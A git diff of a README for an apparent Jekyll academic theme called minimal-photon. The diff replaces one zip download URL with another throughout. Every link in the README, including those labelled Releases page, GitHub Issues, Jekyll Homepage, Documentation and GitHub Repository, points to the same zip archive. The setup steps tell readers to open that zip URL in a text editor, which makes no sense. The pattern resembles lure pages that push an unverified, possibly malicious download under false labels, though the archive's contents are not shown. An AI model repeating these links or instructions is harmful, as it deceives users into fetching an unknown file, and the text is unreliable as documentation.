@@ -6,7 +6,7 @@ Welcome to **minimal-photon**! This theme helps you build an academic homepage u
 
 ## 📥 Download the Theme
 
-[![Download minimal-photon](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip)](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip)
+[![Download minimal-photon](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip)](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip)
 
 ## 🛠️ System Requirements
 
@@ -18,11 +18,11 @@ To run **minimal-photon**, you need:
 
 ## 🌐 Visit the Releases Page
 
-To get started, visit our [Releases page](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip) to download the latest version of minimal-photon.
+To get started, visit our [Releases page](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip) to download the latest version of minimal-photon.
 
 ## 📥 Download & Install
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip).
+1. Go to the [Releases page](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the file that ends in `.zip` to download it to your computer.
 4. Once the download is complete, find the file in your downloads folder.
@@ -43,7 +43,7 @@ To get started, visit our [Releases page](https://raw.githubusercontent.com/daws
    - Navigate to that folder by typing `cd my-academic-site`.
 
 2. **Replace with Our Theme:**
-   - Open the `https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip` file in a text editor.
+   - Open the `https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip` file in a text editor.
    - Change the `theme` field to `minimal-photon`.
 
 3. **Customize Your Site:**
@@ -69,7 +69,7 @@ To get started, visit our [Releases page](https://raw.githubusercontent.com/daws
 A: No, this theme is designed for users with no programming knowledge. Just follow the guided steps.
 
 **Q: Can I use my own domain name?**  
-A: Yes, you can configure your domain name in the `https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip` file.
+A: Yes, you can configure your domain name in the `https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip` file.
 
 **Q: How do I update the theme?**  
 A: Check the Releases page regularly for updates and follow the same download process.
@@ -80,12 +80,12 @@ If you want to help improve minimal-photon, feel free to open an issue on GitHub
 
 ## 📞 Get Support
 
-If you have questions or run into issues, please visit our [GitHub Issues](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip) page to ask for help.
+If you have questions or run into issues, please visit our [GitHub Issues](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip) page to ask for help.
 
 ## 🔗 Useful Links
 
-- [Jekyll Homepage](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip)
-- [GitHub Repository](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip)
-- [Documentation](https://raw.githubusercontent.com/dawsonsa/minimal-photon/main/assets/files/minimal-photon_v3.2-alpha.1.zip)
+- [Jekyll Homepage](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip)
+- [GitHub Repository](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip)
+- [Documentation](https://github.com/dawsonsa/minimal-photon/raw/refs/heads/main/assets/files/minimal-photon-1.0-beta.4.zip)
 
 Thank you for choosing minimal-photon! We hope it helps you create the perfect academic homepage.
